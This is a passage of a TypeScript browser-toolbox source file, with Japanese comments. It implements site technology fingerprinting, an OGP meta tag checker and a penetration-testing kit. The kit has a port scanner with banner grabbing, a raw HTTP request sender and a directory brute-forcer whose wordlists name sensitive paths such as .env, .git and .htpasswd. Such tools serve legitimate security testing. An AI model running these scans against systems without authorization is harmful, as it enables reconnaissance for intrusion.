        if (
          reasons.length > 0 &&
          reasons[reasons.length - 1].startsWith("Cookie:")
        )
          break;
      }
    }
    if (sig.global && globalSet.size > 0) {
      for (const g of sig.global) {
        if (globalSet.has(g)) {
          reasons.push(`window.${g}`);
          break;
        }
      }
    }

    // version が他で取得できなければ headers/HTML 全体から再走査
    if (!version && sig.version) {
      for (const re of sig.version) {
        const m = headerJoined.match(re) || head.match(re);
        if (m && m[1]) {
          version = m[1];
          break;
        }
      }
    }

    if (reasons.length > 0) {
      out.push({
        name: sig.name,
        category: sig.category,
        icon: sig.icon,
        matches: reasons,
        version,
      });
    }
  }
  // 重複検出 (同名) を排除して reasons をマージ
  const merged = new Map<string, DetectedTech>();
  for (const d of out) {
    const exist = merged.get(d.name);
    if (exist) {
      for (const r of d.matches)
        if (!exist.matches.includes(r)) exist.matches.push(r);
      if (!exist.version && d.version) exist.version = d.version;
    } else {
      merged.set(d.name, d);
    }
  }
  return Array.from(merged.values());
}

function truncate(s: string, n = 60): string {
  return s.length > n ? s.slice(0, n) + "…" : s;
}

function setupTechProfileTool(): void {
  const scanBtn = document.getElementById(
    "tech-scan",
  ) as HTMLButtonElement | null;
  const scanUrlBtn = document.getElementById(
    "tech-scan-url",
  ) as HTMLButtonElement | null;
  const urlEl = document.getElementById("tech-url") as HTMLInputElement | null;
  const statusEl = document.getElementById(
    "tech-status",
  ) as HTMLSpanElement | null;
  const resultEl = document.getElementById(
    "tech-result",
  ) as HTMLDivElement | null;
  if (!scanBtn || !urlEl || !resultEl) return;

  async function scan(url: string, useActiveDom = false): Promise<void> {
    if (!url && !useActiveDom) {
      if (statusEl) statusEl.textContent = "URL がありません";
      return;
    }
    if (statusEl) statusEl.textContent = "解析中…";
    resultEl!.innerHTML = "";
    try {
      let body = "";
      let contentType = "text/html";
      let status = 200;
      let bytes = 0;
      let displayUrl = url;
      let headers: [string, string][] = [];
      let cookies: string[] = [];
      const globals: string[] = [];
      let usedDom = false;
      // アクティブタブの DOM (描画後の HTML) をまず取得して
      // クライアントサイドフレームワークの検出精度を上げる。
      if (useActiveDom) {
        try {
          const got = await invoke<{ html: string; url: string }>(
            "view_get_active_html",
          );
          body = got.html;
          displayUrl = got.url || url;
          bytes = body.length;
          usedDom = true;
        } catch {
          // フォールバックでサーバ取得
        }
      }
      // 同じ URL に対して toolbox_scrape_fetch を呼んでヘッダ/Cookie も取得する。
      // (DOM 取得済みでも、HTTP ヘッダや Set-Cookie の解析が極めて重要なので
      //  並列に server fetch も行う。失敗してもサイレントに DOM 検出のみ続行。)
      try {
        const r = await invoke<ScrapeResult>("toolbox_scrape_fetch", {
          url: url || displayUrl,
          userAgent: null,
        });
        if (!body) {
          body = r.body;
          displayUrl = url || displayUrl;
        }
        contentType = r.content_type;
        status = r.status;
        bytes = bytes || r.bytes;
        headers = r.headers || [];
        cookies = r.cookies || [];
      } catch (e) {
        if (!body) {
          if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
          return;
        }
      }
      // 既知のフレームワーク用グローバル変数の取得は未対応 (将来 view_eval を実装したら埋める)。
      const detected = detectTechFromHtml(
        body,
        contentType,
        headers,
        cookies,
        globals,
      );
      const sourceLabel = usedDom ? `DOM+HTTP ${status}` : `HTTP ${status}`;
      if (statusEl)
        statusEl.textContent = `${detected.length} 件検出 (${sourceLabel}, ${bytes.toLocaleString()} bytes, ヘッダ ${headers.length}, Cookie ${cookies.length})`;
      renderTechResult(displayUrl, detected);
    } catch (e) {
      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
    }
  }

  function renderTechResult(url: string, list: DetectedTech[]): void {
    if (!resultEl) return;
    if (list.length === 0) {
      resultEl.innerHTML = `<div class="toolbox-note">検出された技術はありません: ${escapeHtml(url)}</div>`;
      return;
    }
    // カテゴリ別にグループ
    const groups = new Map<string, DetectedTech[]>();
    for (const t of list) {
      if (!groups.has(t.category)) groups.set(t.category, []);
      groups.get(t.category)!.push(t);
    }
    // よく見るカテゴリを上に持ってくる。
    const order = [
      "CMS",
      "EC",
      "決済",
      "フレームワーク",
      "JSライブラリ",
      "CSS",
      "アイコン",
      "サーバ",
      "サーバ言語",
      "Webサーバ",
      "ホスティング",
      "CDN",
      "キャッシュ",
      "リバースプロキシ",
      "ビルド",
      "解析",
      "タグ管理",
      "A-Bテスト",
      "監視",
      "広告",
      "SNS",
      "メディア",
      "地図",
      "フォント",
      "セキュリティ",
      "認証",
      "BaaS",
      "検索",
      "PWA",
      "メタ",
      "プロトコル",
      "サポート",
      "マーケ",
      "静的サイトジェネレータ",
      "CMS (Headless)",
    ];
    const sortedCats = Array.from(groups.keys()).sort((a, b) => {
      const ia = order.indexOf(a);
      const ib = order.indexOf(b);
      if (ia < 0 && ib < 0) return a.localeCompare(b);
      if (ia < 0) return 1;
      if (ib < 0) return -1;
      return ia - ib;
    });
    const html: string[] = [];
    html.push(
      `<div class="toolbox-note">対象: <code>${escapeHtml(url)}</code></div>`,
    );
    for (const cat of sortedCats) {
      const items = groups.get(cat)!;
      html.push(
        `<div class="tech-card" style="border:1px solid var(--border, rgba(255,255,255,0.15));border-radius:6px;padding:8px;background:rgba(255,255,255,0.04);color:inherit">`,
      );
      html.push(
        `<div style="font-weight:bold;margin-bottom:6px;color:inherit">${escapeHtml(cat)} <span style="opacity:0.7;font-weight:normal">(${items.length})</span></div>`,
      );
      html.push(`<div style="display:flex;flex-wrap:wrap;gap:6px">`);
      for (const t of items) {
        const tip = t.matches.join(" / ").replace(/"/g, "&quot;");
        const ver = t.version
          ? ` <span style="opacity:0.7">${escapeHtml(t.version)}</span>`
          : "";
        html.push(
          `<span title="${tip}" style="display:inline-flex;align-items:center;gap:4px;padding:4px 10px;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.18);border-radius:14px;font-size:12px;color:inherit">${t.icon || "🔧"} ${escapeHtml(t.name)}${ver}</span>`,
        );
      }
      html.push(`</div></div>`);
    }
    resultEl.innerHTML = html.join("");
  }

  scanBtn.addEventListener("click", () => {
    const a = activeTab();
    if (!a) {
      if (statusEl) statusEl.textContent = "アクティブなタブがありません";
      return;
    }
    void scan(a.url, true);
  });
  scanUrlBtn?.addEventListener("click", () => {
    void scan(urlEl.value.trim());
  });
  urlEl.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      e.preventDefault();
      void scan(urlEl.value.trim());
    }
  });
}

// ===== 🏷️ OGP / メタタグチェッカー =====

interface OGPData {
  url: string;
  title: string;
  description: string;
  canonical: string;
  language: string;
  charset: string;
  favicon: string;
  // OG
  ogTitle: string;
  ogDescription: string;
  ogImage: string;
  ogUrl: string;
  ogType: string;
  ogSiteName: string;
  ogLocale: string;
  // Twitter
  twitterCard: string;
  twitterTitle: string;
  twitterDescription: string;
  twitterImage: string;
  twitterSite: string;
  twitterCreator: string;
  // 全メタタグ (raw)
  raw: { key: string; value: string }[];
}

function extractMeta(html: string, base: string): OGPData {
  const data: OGPData = {
    url: base,
    title: "",
    description: "",
    canonical: "",
    language: "",
    charset: "",
    favicon: "",
    ogTitle: "",
    ogDescription: "",
    ogImage: "",
    ogUrl: "",
    ogType: "",
    ogSiteName: "",
    ogLocale: "",
    twitterCard: "",
    twitterTitle: "",
    twitterDescription: "",
    twitterImage: "",
    twitterSite: "",
    twitterCreator: "",
    raw: [],
  };

  const headMatch = html.match(/<head[^>]*>([\s\S]*?)<\/head>/i);
  const head = headMatch ? headMatch[1] : html.slice(0, 100000);

  const t = head.match(/<title[^>]*>([\s\S]*?)<\/title>/i);
  if (t) data.title = decodeEntities(t[1].trim());

  // <html lang>
  const lang = html.match(/<html[^>]+lang=["']([^"']+)["']/i);
  if (lang) data.language = lang[1];
  // charset
  const cs = head.match(/<meta[^>]+charset=["']?([\w-]+)/i);
  if (cs) data.charset = cs[1];

  // canonical
  const can = head.match(
    /<link[^>]+rel=["']canonical["'][^>]+href=["']([^"']+)["']/i,
  );
  if (can) data.canonical = resolveUrl(can[1], base);

  // favicon
  const fav = head.match(
    /<link[^>]+rel=["'](?:shortcut )?icon["'][^>]+href=["']([^"']+)["']/i,
  );
  if (fav) data.favicon = resolveUrl(fav[1], base);

  // 全 <meta> 抽出
  const metaRe = /<meta\s+([^>]+?)\/?>/gi;
  let m: RegExpExecArray | null;
  while ((m = metaRe.exec(head)) !== null) {
    const attrs = m[1];
    const nameM = attrs.match(
      /(?:^|\s)(?:name|property|http-equiv|itemprop)\s*=\s*["']([^"']+)["']/i,
    );
    const contentM = attrs.match(/(?:^|\s)content\s*=\s*["']([^"']*)["']/i);
    if (!nameM || !contentM) continue;
    const key = nameM[1];
    const val = decodeEntities(contentM[1]);
    data.raw.push({ key, value: val });
    const lk = key.toLowerCase();
    if (lk === "description") data.description = val;
    else if (lk === "og:title") data.ogTitle = val;
    else if (lk === "og:description") data.ogDescription = val;
    else if (lk === "og:image") data.ogImage = resolveUrl(val, base);
    else if (lk === "og:url") data.ogUrl = val;
    else if (lk === "og:type") data.ogType = val;
    else if (lk === "og:site_name") data.ogSiteName = val;
    else if (lk === "og:locale") data.ogLocale = val;
    else if (lk === "twitter:card") data.twitterCard = val;
    else if (lk === "twitter:title") data.twitterTitle = val;
    else if (lk === "twitter:description") data.twitterDescription = val;
    else if (lk === "twitter:image") data.twitterImage = resolveUrl(val, base);
    else if (lk === "twitter:site") data.twitterSite = val;
    else if (lk === "twitter:creator") data.twitterCreator = val;
  }
  return data;
}

function decodeEntities(s: string): string {
  return s
    .replace(/&amp;/g, "&")
    .replace(/&lt;/g, "<")
    .replace(/&gt;/g, ">")
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/&nbsp;/g, " ");
}

function resolveUrl(u: string, base: string): string {
  try {
    return new URL(u, base).toString();
  } catch {
    return u;
  }
}

function setupOGPTool(): void {
  const scanBtn = document.getElementById(
    "ogp-scan",
  ) as HTMLButtonElement | null;
  const scanUrlBtn = document.getElementById(
    "ogp-scan-url",
  ) as HTMLButtonElement | null;
  const urlEl = document.getElementById("ogp-url") as HTMLInputElement | null;
  const statusEl = document.getElementById(
    "ogp-status",
  ) as HTMLSpanElement | null;
  const previewEl = document.getElementById(
    "ogp-preview",
  ) as HTMLDivElement | null;
  const twitterEl = document.getElementById(
    "ogp-twitter",
  ) as HTMLDivElement | null;
  const tableEl = document.getElementById(
    "ogp-table",
  ) as HTMLTableElement | null;
  const checksEl = document.getElementById(
    "ogp-checks",
  ) as HTMLUListElement | null;
  if (!scanBtn || !urlEl || !previewEl || !tableEl || !checksEl) return;

  async function scan(url: string): Promise<void> {
    if (!url) {
      if (statusEl) statusEl.textContent = "URL がありません";
      return;
    }
    if (statusEl) statusEl.textContent = "取得中…";
    previewEl!.style.display = "none";
    previewEl!.innerHTML = "";
    if (twitterEl) twitterEl.innerHTML = "";
    tableEl!.innerHTML = "";
    checksEl!.innerHTML = "";
    try {
      const r = await invoke<ScrapeResult>("toolbox_scrape_fetch", {
        url,
        userAgent: null,
      });
      const data = extractMeta(r.body, url);
      if (statusEl)
        statusEl.textContent = `OK (HTTP ${r.status}, メタタグ ${data.raw.length} 個)`;
      renderOGP(data);
    } catch (e) {
      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
    }
  }

  function renderOGP(d: OGPData): void {
    // Facebook 風プレビュー
    const fbTitle = d.ogTitle || d.title;
    const fbDesc = d.ogDescription || d.description;
    const fbImg = d.ogImage;
    const fbHost = (() => {
      try {
        return new URL(d.ogUrl || d.url).hostname;
      } catch {
        return "";
      }
    })();
    previewEl!.style.display = "block";
    previewEl!.innerHTML = `
      <div style="border:1px solid #ccd0d5;border-radius:8px;overflow:hidden;max-width:520px;background:#f2f3f5">
        ${fbImg ? `<div style="width:100%;aspect-ratio:1.91;background:#e4e6eb url('${escapeAttr(fbImg)}') center/cover no-repeat"></div>` : ""}
        <div style="padding:10px 12px">
          <div style="text-transform:uppercase;color:#606770;font-size:12px;margin-bottom:4px">${escapeHtml(fbHost)}</div>
          <div style="font-weight:bold;font-size:16px;color:#1d2129;line-height:1.3;margin-bottom:4px">${escapeHtml(fbTitle || "(タイトルなし)")}</div>
          <div style="color:#606770;font-size:13px;line-height:1.4;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden">${escapeHtml(fbDesc || "(説明なし)")}</div>
        </div>
      </div>`;

    // Twitter プレビュー
    if (twitterEl) {
      const tTitle = d.twitterTitle || d.ogTitle || d.title;
      const tDesc = d.twitterDescription || d.ogDescription || d.description;
      const tImg = d.twitterImage || d.ogImage;
      const isLarge =
        (d.twitterCard || "").toLowerCase() === "summary_large_image";
      twitterEl.innerHTML = `
        <div style="border:1px solid #cfd9de;border-radius:16px;overflow:hidden;max-width:520px">
          ${
            tImg
              ? isLarge
                ? `<div style="width:100%;aspect-ratio:2;background:#eff3f4 url('${escapeAttr(tImg)}') center/cover no-repeat"></div>`
                : ""
              : ""
          }
          <div style="display:flex;${isLarge || !tImg ? "" : "min-height:125px"}">
            ${
              !isLarge && tImg
                ? `<div style="flex:0 0 125px;background:#eff3f4 url('${escapeAttr(tImg)}') center/cover no-repeat;border-right:1px solid #cfd9de"></div>`
                : ""
            }
            <div style="padding:12px;flex:1">
              <div style="color:#536471;font-size:13px;margin-bottom:2px">${escapeHtml(fbHost)}</div>
              <div style="font-size:15px;color:#0f1419;line-height:1.3;margin-bottom:2px">${escapeHtml(tTitle || "(タイトルなし)")}</div>
              <div style="color:#536471;font-size:13px;line-height:1.4;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden">${escapeHtml(tDesc || "")}</div>
              <div style="color:#536471;font-size:12px;margin-top:4px">card: ${escapeHtml(d.twitterCard || "(未指定)")}</div>
            </div>
          </div>
        </div>`;
    }

    // テーブル
    const rows: { k: string; v: string }[] = [];
    rows.push({ k: "title", v: d.title });
    rows.push({ k: "description", v: d.description });
    rows.push({ k: "canonical", v: d.canonical });
    rows.push({ k: "html lang", v: d.language });
    rows.push({ k: "charset", v: d.charset });
    rows.push({ k: "favicon", v: d.favicon });
    for (const r of d.raw) rows.push({ k: r.key, v: r.value });
    tableEl!.innerHTML =
      `<thead><tr style="background:#f0f0f0"><th style="text-align:left;padding:4px 6px;border:1px solid #ddd;width:30%">キー</th><th style="text-align:left;padding:4px 6px;border:1px solid #ddd">値</th></tr></thead><tbody>` +
      rows
        .filter((r) => r.v)
        .map(
          (r) =>
            `<tr><td style="padding:4px 6px;border:1px solid #ddd;font-family:ui-monospace,monospace;font-size:11px">${escapeHtml(r.k)}</td><td style="padding:4px 6px;border:1px solid #ddd;word-break:break-all">${escapeHtml(r.v)}</td></tr>`,
        )
        .join("") +
      `</tbody>`;

    // チェック
    const checks: { ok: boolean; msg: string }[] = [];
    checks.push({ ok: !!d.title, msg: "<title> がある" });
    checks.push({ ok: !!d.description, msg: "<meta description> がある" });
    checks.push({ ok: !!d.ogTitle, msg: "og:title がある" });
    checks.push({ ok: !!d.ogDescription, msg: "og:description がある" });
    checks.push({ ok: !!d.ogImage, msg: "og:image がある" });
    checks.push({ ok: !!d.ogUrl, msg: "og:url がある" });
    checks.push({ ok: !!d.ogType, msg: "og:type がある" });
    checks.push({ ok: !!d.twitterCard, msg: "twitter:card がある" });
    checks.push({ ok: !!d.canonical, msg: "rel=canonical がある" });
    checksEl!.innerHTML = checks
      .map(
        (c) =>
          `<li style="color:${c.ok ? "#1a7f37" : "#cf222e"}">${c.ok ? "✅" : "❌"} ${escapeHtml(c.msg)}</li>`,
      )
      .join("");
  }

  scanBtn.addEventListener("click", () => {
    const a = activeTab();
    if (!a) {
      if (statusEl) statusEl.textContent = "アクティブなタブがありません";
      return;
    }
    void scan(a.url);
  });
  scanUrlBtn?.addEventListener("click", () => void scan(urlEl.value.trim()));
  urlEl.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      e.preventDefault();
      void scan(urlEl.value.trim());
    }
  });
}

function escapeAttr(s: string): string {
  return String(s).replace(/&/g, "&amp;").replace(/"/g, "&quot;");
}

function escapeHtml(s: string): string {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

// ===== 🛡️ ペネトレーション テストキット =====

const TOP_100_PORTS = [
  21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723,
  3306, 3389, 5900, 8080, 8443, 20, 26, 37, 79, 81, 88, 106, 113, 119, 161, 179,
  199, 389, 427, 444, 465, 513, 514, 515, 543, 544, 548, 554, 587, 631, 646,
  873, 902, 990, 1025, 1026, 1027, 1028, 1029, 1110, 1433, 1434, 1521, 1755,
  1900, 2000, 2001, 2049, 2121, 2717, 3128, 3268, 3690, 3986, 4899, 5000, 5009,
  5051, 5060, 5101, 5190, 5357, 5432, 5631, 5666, 5800, 5985, 5986, 6000, 6001,
  6646, 7070, 8000, 8008, 8009, 8081, 8888, 9100, 9999, 10000, 32768, 49152,
  49153, 49154, 49155, 49156, 49157,
];

const COMMON_24_PORTS = [
  21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 389, 443, 445, 465, 587, 993,
  995, 1433, 3306, 3389, 5432, 5900, 8080,
];

function parsePortSpec(spec: string): number[] {
  const out = new Set<number>();
  for (const piece of spec.split(/[\s,]+/).filter(Boolean)) {
    const m = piece.match(/^(\d+)\s*-\s*(\d+)$/);
    if (m) {
      const a = parseInt(m[1]);
      const b = parseInt(m[2]);
      const lo = Math.min(a, b);
      const hi = Math.max(a, b);
      for (let p = lo; p <= hi; p++) {
        if (p >= 1 && p <= 65535) out.add(p);
      }
    } else {
      const p = parseInt(piece);
      if (Number.isFinite(p) && p >= 1 && p <= 65535) out.add(p);
    }
  }
  return [...out].sort((a, b) => a - b);
}

const PORT_NAMES: Record<number, string> = {
  21: "ftp",
  22: "ssh",
  23: "telnet",
  25: "smtp",
  53: "dns",
  80: "http",
  110: "pop3",
  111: "rpcbind",
  135: "msrpc",
  139: "netbios-ssn",
  143: "imap",
  389: "ldap",
  443: "https",
  445: "smb",
  465: "smtps",
  587: "submission",
  993: "imaps",
  995: "pop3s",
  1433: "mssql",
  1521: "oracle",
  2049: "nfs",
  3000: "node-dev",
  3306: "mysql",
  3389: "rdp",
  5432: "postgres",
  5900: "vnc",
  5985: "winrm",
  6379: "redis",
  8000: "http-alt",
  8080: "http-proxy",
  8443: "https-alt",
  8888: "http-alt",
  9090: "http-alt",
  9200: "elasticsearch",
  11211: "memcached",
  27017: "mongodb",
};

interface PortScanRow {
  port: number;
  open: boolean;
  banner: string | null;
}

function setupPortScannerSub(): void {
  const hostEl = document.getElementById("ps-host") as HTMLInputElement | null;
  const presetEl = document.getElementById(
    "ps-preset",
  ) as HTMLSelectElement | null;
  const portsEl = document.getElementById(
    "ps-ports",
  ) as HTMLInputElement | null;
  const bannerEl = document.getElementById(
    "ps-banner",
  ) as HTMLInputElement | null;
  const timeoutEl = document.getElementById(
    "ps-timeout",
  ) as HTMLInputElement | null;
  const runBtn = document.getElementById("ps-run") as HTMLButtonElement | null;
  const statusEl = document.getElementById(
    "ps-status",
  ) as HTMLSpanElement | null;
  const outEl = document.getElementById("ps-out") as HTMLPreElement | null;
  if (!hostEl || !runBtn || !outEl) return;

  presetEl?.addEventListener("change", () => {
    if (!portsEl) return;
    if (presetEl.value === "top") portsEl.value = "(Top 100)";
    else if (presetEl.value === "common") portsEl.value = "(よく使う 24)";
    else if (presetEl.value === "all") portsEl.value = "1-1024";
    else portsEl.value = "";
  });

  runBtn.addEventListener("click", async () => {
    const host = hostEl.value.trim();
    if (!host) {
      if (statusEl) statusEl.textContent = "ホストを入力";
      return;
    }
    let ports: number[] = [];
    const preset = presetEl?.value || "top";
    if (preset === "top") ports = TOP_100_PORTS;
    else if (preset === "common") ports = COMMON_24_PORTS;
    else if (preset === "all") {
      ports = [];
      for (let p = 1; p <= 1024; p++) ports.push(p);
    } else {
      ports = parsePortSpec(portsEl?.value || "");
    }
    if (ports.length === 0) {
      if (statusEl) statusEl.textContent = "ポートが空です";
      return;
    }
    if (statusEl)
      statusEl.textContent = `${host} の ${ports.length} ポートをスキャン中…`;
    outEl.textContent = "";
    const t0 = performance.now();
    try {
      const rows = await invoke<PortScanRow[]>("pentest_port_scan", {
        host,
        ports,
        timeoutMs: parseInt(timeoutEl?.value || "800"),
        grabBanner: bannerEl?.checked ?? true,
      });
      const dt = Math.round(performance.now() - t0);
      if (statusEl)
        statusEl.textContent = `完了 (${rows.length} 個 OPEN / ${ports.length} スキャン / ${dt}ms)`;
      const lines: string[] = [];
      lines.push(`Host: ${host}`);
      lines.push(`Open ports: ${rows.length} / ${ports.length}`);
      lines.push("─".repeat(60));
      lines.push("PORT     SERVICE        BANNER");
      for (const r of rows) {
        const svc = (PORT_NAMES[r.port] || "").padEnd(14);
        const port = `${r.port}/tcp`.padEnd(8);
        const banner = r.banner || "";
        lines.push(`${port} ${svc} ${banner}`);
      }
      outEl.textContent = lines.join("\n");
    } catch (e) {
      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
    }
  });
}

interface HttpReqResultTS {
  status: number;
  status_text: string;
  headers: [string, string][];
  body: string;
  bytes: number;
  content_type: string;
  time_ms: number;
  final_url: string;
}

function parseHeaderLines(text: string): [string, string][] {
  const out: [string, string][] = [];
  for (const line of text.split(/\r?\n/)) {
    const m = line.match(/^\s*([^:\s][^:]*?)\s*:\s*(.*)$/);
    if (m) out.push([m[1], m[2]]);
  }
  return out;
}

function setupHttpReqSub(): void {
  const methodEl = document.getElementById(
    "hr-method",
  ) as HTMLSelectElement | null;
  const urlEl = document.getElementById("hr-url") as HTMLInputElement | null;
  const followEl = document.getElementById(
    "hr-follow",
  ) as HTMLInputElement | null;
  const sendBtn = document.getElementById(
    "hr-send",
  ) as HTMLButtonElement | null;
  const headersEl = document.getElementById(
    "hr-headers",
  ) as HTMLTextAreaElement | null;
  const bodyEl = document.getElementById(
    "hr-body",
  ) as HTMLTextAreaElement | null;
  const rawEl = document.getElementById("hr-raw") as HTMLTextAreaElement | null;
  const rawLoadBtn = document.getElementById(
    "hr-raw-load",
  ) as HTMLButtonElement | null;
  const statusEl = document.getElementById(
    "hr-status",
  ) as HTMLDivElement | null;
  const respHeadersEl = document.getElementById(
    "hr-resp-headers",
  ) as HTMLPreElement | null;
  const respBodyEl = document.getElementById(
    "hr-resp-body",
  ) as HTMLPreElement | null;
  if (!sendBtn || !urlEl) return;

  rawLoadBtn?.addEventListener("click", () => {
    const text = rawEl?.value || "";
    if (!text) return;
    const lines = text.split(/\r?\n/);
    const reqLine = lines[0]?.match(/^(\S+)\s+(\S+)\s+HTTP/);
    if (!reqLine) {
      alert("リクエスト行が読めません (例: POST /path HTTP/1.1)");
      return;
    }
    const method = reqLine[1];
    let path = reqLine[2];
    let host = "";
    const hdrLines: string[] = [];
    let i = 1;
    for (; i < lines.length; i++) {
      const ln = lines[i];
      if (ln.trim() === "") {
        i++;
        break;
      }
      hdrLines.push(ln);
      const hm = ln.match(/^Host:\s*(.+)$/i);
      if (hm) host = hm[1].trim();
    }
    const body = lines.slice(i).join("\n");
    if (methodEl) methodEl.value = method;
    const scheme = host.includes(":443") ? "https" : "http";
    if (host && urlEl) urlEl.value = `${scheme}://${host}${path}`;
    if (headersEl)
      headersEl.value = hdrLines.filter((l) => !/^host:/i.test(l)).join("\n");
    if (bodyEl) bodyEl.value = body;
  });

  sendBtn.addEventListener("click", async () => {
    const url = urlEl.value.trim();
    if (!url) {
      if (statusEl) statusEl.textContent = "URL を入力";
      return;
    }
    if (statusEl) statusEl.textContent = "送信中…";
    if (respHeadersEl) respHeadersEl.textContent = "";
    if (respBodyEl) respBodyEl.textContent = "";
    try {
      const r = await invoke<HttpReqResultTS>("pentest_http_request", {
        method: methodEl?.value || "GET",
        url,
        headers: parseHeaderLines(headersEl?.value || ""),
        body: bodyEl?.value || null,
        timeoutMs: 15000,
        followRedirects: followEl?.checked ?? true,
      });
      if (statusEl)
        statusEl.textContent = `${r.status} ${r.status_text} • ${r.bytes.toLocaleString()} bytes • ${r.time_ms}ms • ${r.content_type} • → ${r.final_url}`;
      if (respHeadersEl)
        respHeadersEl.textContent = r.headers
          .map(([k, v]) => `${k}: ${v}`)
          .join("\n");
      if (respBodyEl) respBodyEl.textContent = r.body;
    } catch (e) {
      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
    }
  });
}

const WORDLIST_COMMON = `admin
administrator
api
app
assets
backup
backups
blog
cgi-bin
config
console
dashboard
data
db
debug
dev
download
downloads
env
files
forum
ftp
home
images
img
include
includes
index
info
internal
js
json
lib
log
login
logs
mail
manager
media
old
panel
phpinfo
phpmyadmin
private
public
robots
secret
secure
server-status
setup
shop
site
sites
sql
src
staff
staging
static
stats
status
storage
support
system
templates
temp
test
tmp
tools
upload
uploads
user
users
v1
v2
vendor
web
webadmin
wordpress
wp-admin
wp-content
wp-includes
xml`;

const WORDLIST_DIRB_SMALL = `${WORDLIST_COMMON}
.git
.svn
.env
.htaccess
.htpasswd
.well-known
about
account
accounts
ads
ajax
analytics
archive
asp
aspnet_client
auth
beta
billing
build
cache
calendar
career
cart
catalog
chat
checkout
cms
common
contact
content
controllers
core
crm
css
custom
customer
default
dist
doc
docs
documents
edit
editor
embed
error
errors
events
example
export
external
fonts
graphql
help
host
images2
import
intranet
inventory
invoice
issues
java
jobs
keys
layout
ldap
legacy
library
list
local
location
mailer
maintenance
manage
marketing
member
members
messages
mobile
module
modules
monitoring
news
newsletter
notice
office
oldsite
order
orders
out
page
pages
partner
pay
payment
payments
phpinfo.php
phpunit
pma
plugins
portal
post
posts
preview
profile
profiles
project
projects
proxy
pub
register
report
reports
research
restore
review
reviews
rss
sales
search
security
service
services
shopping
sign
signup
sitemap
sitemap.xml
soap
software
solutions
spider
ssl
stage
store
stories
subscribe
suppliers
survey
sysadmin
team
test1
test2
testing
tickets
training
trash
update
updates
upgrade
v3
videos
view
welcome
widget
wiki`;

let dbAbort = false;

// SecLists (MIT) のガチ辞書を初回だけ DL して localStorage にキャッシュ。
const SECLISTS_URLS: Record<string, string> = {
  "seclists-common":
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt",
  "seclists-big":
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/big.txt",
  "seclists-raft-medium":
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-medium-directories.txt",
};

async function fetchSecListsWordlist(key: string): Promise<string> {
  const cacheKey = `yuzu-wordlist-${key}-v1`;
  const cached = localStorage.getItem(cacheKey);
  if (cached) return cached;
  const url = SECLISTS_URLS[key];
  if (!url) throw new Error(`unknown wordlist: ${key}`);
  // pentest_http_request 経由で DL (CORS 回避)
  const r = await invoke<HttpReqResultTS>("pentest_http_request", {
    method: "GET",
    url,
    headers: [],
    body: null,
    timeoutMs: 30000,
    followRedirects: true,
  });
  if (r.status !== 200) throw new Error(`HTTP ${r.status}`);
  const text = r.body || "";
  if (!text || text.length < 100) throw new Error("empty body");
  try {
    localStorage.setItem(cacheKey, text);
  } catch {
    /* quota over は無視 (キャッシュなしで動かす) */
  }
  return text;
}

function setupDirBusterSub(): void {
  const baseEl = document.getElementById("db-base") as HTMLInputElement | null;
  const extEl = document.getElementById("db-ext") as HTMLInputElement | null;
  const concEl = document.getElementById("db-conc") as HTMLInputElement | null;
  const wlEl = document.getElementById(
    "db-wordlist",
  ) as HTMLSelectElement | null;
  const wordsEl = document.getElementById(
    "db-words",
  ) as HTMLTextAreaElement | null;
  const excludeEl = document.getElementById(
    "db-exclude",
  ) as HTMLInputElement | null;
  const runBtn = document.getElementById("db-run") as HTMLButtonElement | null;
  const stopBtn = document.getElementById(
    "db-stop",
  ) as HTMLButtonElement | null;
  const statusEl = document.getElementById(
    "db-status",
  ) as HTMLSpanElement | null;
  const outEl = document.getElementById("db-out") as HTMLPreElement | null;
  if (!baseEl || !runBtn || !outEl) return;

  stopBtn?.addEventListener("click", () => {
    dbAbort = true;
  });

  runBtn.addEventListener("click", async () => {
    const base = baseEl.value.trim().replace(/\/+$/, "");
    if (!base) {
      if (statusEl) statusEl.textContent = "ベースURL 必須";
      return;
    }
    let words: string[] = [];
    const wl = wlEl?.value || "common";
    if (wl === "common") words = WORDLIST_COMMON.split(/\n/);
    else if (wl === "dirb-small") words = WORDLIST_DIRB_SMALL.split(/\n/);
    else if (
      wl === "seclists-common" ||
      wl === "seclists-big" ||
      wl === "seclists-raft-medium"
    ) {
      try {
        if (statusEl) statusEl.textContent = "辞書 DL 中…";
        const text = await fetchSecListsWordlist(wl);
        words = text.split(/\r?\n/);
      } catch (e) {
        if (statusEl) statusEl.textContent = `辞書 DL 失敗: ${String(e)}`;
        return;
      }
    } else words = (wordsEl?.value || "").split(/\n/);
    words = [...new Set(words.map((w) => w.trim()).filter(Boolean))];
    const exts = (extEl?.value || "")
      .split(/[,\s]+/)
      .map((e) => e.replace(/^\./, "").trim())
      .filter(Boolean);
    const paths: string[] = [];
    for (const w of words) {
      paths.push(w);
      for (const e of exts) paths.push(`${w}.${e}`);
    }
    const excludeSet = new Set(
      (excludeEl?.value || "404")
        .split(/[,\s]+/)
        .map((s) => parseInt(s))
        .filter((n) => Number.isFinite(n)),
    );
    const concurrency = Math.max(
      1,
      Math.min(30, parseInt(concEl?.value || "10")),
    );
    dbAbort = false;
    outEl.textContent = "";
    let done = 0;
    let found = 0;
    const total = paths.length;
    if (statusEl) statusEl.textContent = `0/${total}`;

    // ---- ソフト 404 検出 ----
    // 存在しないパスを 2 つプローブして、両方とも同じサイズの 200 を返したら
